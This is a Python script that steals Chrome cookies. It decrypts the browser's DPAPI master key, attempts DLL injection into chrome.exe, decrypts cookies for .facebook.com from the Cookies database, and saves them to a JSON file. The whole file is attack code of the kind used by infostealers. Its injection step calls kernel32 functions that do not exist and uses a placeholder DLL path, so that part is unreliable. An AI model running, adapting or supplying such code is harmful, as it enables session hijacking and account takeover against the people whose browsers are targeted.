import os
import json
import base64
import sqlite3
from Crypto.Cipher import AES
import win32crypt
import ctypes

# Define constants for DLL injection
INJECTION_SCRIPT = r"""path/to/your/injection.dll"""


def get_local_state_key():
    """Extract and decrypt the DPAPI-encrypted key."""
    local_state_path = os.path.expandvars(r'%LocalAppData%\\Google\\Chrome\\User Data\\Local State')
    if not os.path.exists(local_state_path):
        raise FileNotFoundError(f"Local State file not found: {local_state_path}")

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key_b64 = local_state.get("os_crypt", {}).get("encrypted_key", None)
    if not encrypted_key_b64:
        raise ValueError("Encrypted key not found in Local State file")

    encrypted_key = base64.b64decode(encrypted_key_b64)
    if not encrypted_key.startswith(b'DPAPI'):
        raise ValueError("Invalid DPAPI key format")
    encrypted_key = encrypted_key[5:]

    # Decrypt DPAPI key
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    print(f"Decrypted DPAPI Key: {decrypted_key.hex()} (Length: {len(decrypted_key)})")
    return decrypted_key


def inject_dll_to_chrome():
    """Inject a DLL into Chrome to bypass cookie encryption restrictions."""
    try:
        # Locate Chrome process
        chrome_process_id = ctypes.windll.kernel32.FindProcessByName("chrome.exe")
        if not chrome_process_id:
            raise RuntimeError("Chrome process not found. Ensure Chrome is running.")

        # Inject DLL
        ctypes.windll.kernel32.InjectDLL(chrome_process_id, INJECTION_SCRIPT)
        print("DLL successfully injected into Chrome.")
    except Exception as e:
        print(f"DLL injection failed: {e}")


def decrypt_cookie(master_key, encrypted_cookie):
    """Decrypt a single cookie using AES-GCM."""
    try:
        if not encrypted_cookie.startswith(b'v10') and not encrypted_cookie.startswith(b'v20'):
            raise ValueError("Unsupported cookie encryption format")

        nonce = encrypted_cookie[3:15]
        ciphertext = encrypted_cookie[15:-16]
        tag = encrypted_cookie[-16:]

        # Debugging information
        print(f"Nonce (Length: {len(nonce)}): {nonce.hex()}")
        print(f"Ciphertext (Length: {len(ciphertext)}): {ciphertext.hex()[:64]}...")
        print(f"Tag (Length: {len(tag)}): {tag.hex()}")
        print(f"Master Key: {master_key.hex()} (Length: {len(master_key)})")

        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
        plaintext = cipher.decrypt_and_verify(ciphertext, tag)
        print(f"Decryption successful, length: {len(plaintext)}")
        return plaintext.decode('utf-8')
    except ValueError as e:
        print(f"MAC verification failed or unsupported format: {e}")
    except Exception as e:
        print(f"Decryption failed: {e}")

    return None


def extract_and_decrypt_cookies(domain_filter):
    """Extract and decrypt cookies for the specified domain."""
    cookies_path = os.path.expandvars(r'%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Network\\Cookies')
    if not os.path.exists(cookies_path):
        raise FileNotFoundError(f"Cookies database not found: {cookies_path}")

    # Decrypt local state key
    master_key = get_local_state_key()

    conn = sqlite3.connect(cookies_path)
    conn.text_factory = bytes
    cursor = conn.cursor()

    # Query cookies for the specified domain
    cursor.execute(
        """SELECT name, encrypted_value FROM cookies WHERE host_key LIKE ?""",
        (f"%{domain_filter}%",),
    )

    decrypted_cookies = {}
    for name, encrypted_value in cursor.fetchall():
        try:
            name = name.decode('utf-8')
            print(f"Processing Cookie: {name}")
            decrypted_value = decrypt_cookie(master_key, encrypted_value)
            if decrypted_value:
                decrypted_cookies[name] = decrypted_value
        except ValueError as e:
            print(f"Unsupported format or decryption error for Cookie {name}: {e}")
        except Exception as e:
            print(f"Failed to decrypt Cookie {name}: {e}")

    conn.close()
    return decrypted_cookies


def save_decrypted_cookies_to_file(cookies, output_file):
    """Save the decrypted cookies to a JSON file."""
    try:
        with open(output_file, "w", encoding="utf-8") as f:
            json.dump(cookies, f, indent=4)
        print(f"Decrypted cookies saved to: {output_file}")
    except Exception as e:
        print(f"Failed to save decrypted cookies: {e}")


if __name__ == "__main__":
    domain = ".facebook.com"
    output_file = "decrypted_cookies.json"
    print(f"=== Starting extraction and decryption of Cookies for {domain} ===")
    try:
        inject_dll_to_chrome()
        cookies = extract_and_decrypt_cookies(domain)
        if cookies:
            print("\n=== Decrypted Cookies ===")
            for name, value in cookies.items():
                print(f"{name}: {value}")
            save_decrypted_cookies_to_file(cookies, output_file)
        else:
            print(f"No Cookies found for {domain}")
    except Exception as e:
        print(f"An error occurred during execution: {e}")
